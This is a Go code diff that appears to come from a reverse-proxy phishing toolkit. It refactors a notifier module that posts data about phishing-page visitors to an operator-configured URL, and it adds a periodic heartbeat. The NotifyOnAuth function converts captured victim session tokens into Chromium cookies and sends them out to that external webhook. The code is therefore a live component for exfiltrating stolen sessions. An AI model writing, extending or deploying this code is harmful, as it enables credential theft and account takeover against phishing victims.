@@ -37,13 +37,8 @@ func NotifyGenerateBody(n *Notify, info interface{}) (body []byte, err error) {
 }
 
 // configures and sends the http.Request
-func NotifierSend(n *Notify, info interface{}) error {
+func NotifierSend(n *Notify, body []byte) error {
 	log.Debug("Starting NotifierSend")
-
-	body, err := NotifyGenerateBody(n, info)
-	if err != nil {
-		log.Fatal("%v", err)
-	}
 
 	switch n.Method {
 	case "GET", "POST":
@@ -54,7 +49,7 @@ func NotifierSend(n *Notify, info interface{}) error {
 		}
 		if n.Method == "POST" {
 			req, err = http.NewRequest(http.MethodPost, n.Url, bytes.NewBuffer(body))
-	
+
 			req.Header.Add("Content-Type", "application/json")
 		}
 
@@ -105,7 +100,7 @@ func NotifierSend(n *Notify, info interface{}) error {
 
 // prepares the Body for unauthorized requests and triggers NotifierSend
 func NotifyOnUnauthorized(n *Notify, pl_name string, req_url string, useragent string, remote_addr string) error {
-	b := Unauthorized{
+	info := Unauthorized{
 		Phishlet:    pl_name,
 		Req_url:     req_url,
 		Useragent:   useragent,
@@ -114,7 +109,12 @@ func NotifyOnUnauthorized(n *Notify, pl_name string, req_url string, useragent s
 
 	log.Debug("Starting NotifyOnUnauthorized")
 
-	err := NotifierSend(n, b)
+	body, err := NotifyGenerateBody(n, info)
+	if err != nil {
+		log.Fatal("%v", err)
+	}
+
+	err = NotifierSend(n, body)
 	if err != nil {
 		return err
 	}
@@ -124,7 +124,7 @@ func NotifyOnUnauthorized(n *Notify, pl_name string, req_url string, useragent s
 // prepares the Body for visitors and triggers NotifierSend
 func NotifyOnVisitor(n *Notify, session database.Session, url *url.URL) error {
 	s := session
-	b := Visitor{
+	info := Visitor{
 		Session: s,
 	}
 
@@ -135,7 +135,12 @@ func NotifyOnVisitor(n *Notify, session database.Session, url *url.URL) error {
 		n.Url = fmt.Sprintf("%s/?%s=%s", n.Url, n.ForwardParam, query[n.ForwardParam][0])
 	}
 
-	err := NotifierSend(n, b)
+	body, err := NotifyGenerateBody(n, info)
+	if err != nil {
+		log.Fatal("%v", err)
+	}
+
+	err = NotifierSend(n, body)
 	if err != nil {
 		return err
 	}
@@ -145,7 +150,7 @@ func NotifyOnVisitor(n *Notify, session database.Session, url *url.URL) error {
 // prepares the Body for authorized requests and triggers NotifierSend
 func NotifyOnAuth(n *Notify, session database.Session, phishlet *Phishlet) error {
 	s := session
-	b := Visitor{
+	info := Visitor{
 		Session: s,
 		Tokens:  tokensToCookie(s.Tokens, "Chromium"),
 	}
@@ -153,9 +158,39 @@ func NotifyOnAuth(n *Notify, session database.Session, phishlet *Phishlet) error
 
 	log.Debug("Starting NotifyOnAuth")
 
-	err := NotifierSend(n, b)
+	body, err := NotifyGenerateBody(n, info)
+	if err != nil {
+		log.Fatal("%v", err)
+	}
+
+	err = NotifierSend(n, body)
 	if err != nil {
 		return err
 	}
 	return nil
+}
+
+func NotifyHeartbeat(n *Notify) error {
+	err := NotifierSend(n, []byte(getStatus()))
+	return err
+}
+
+func StartHeartbeat(n *Notify) {
+	for {
+		time.Sleep(time.Minute * time.Duration(n.HeartbeatInterval))
+		if n.Enabled {
+			NotifyHeartbeat(n)
+		} else {
+			return
+		}
+	}
+}
+
+func HeartbeatStartup(cfg *Config) {
+	ns := cfg.notifiers
+	for _, n := range ns {
+		if n.OnEvent == "heartbeat" && n.Enabled {
+			go StartHeartbeat(n)
+		}
+	}
 }
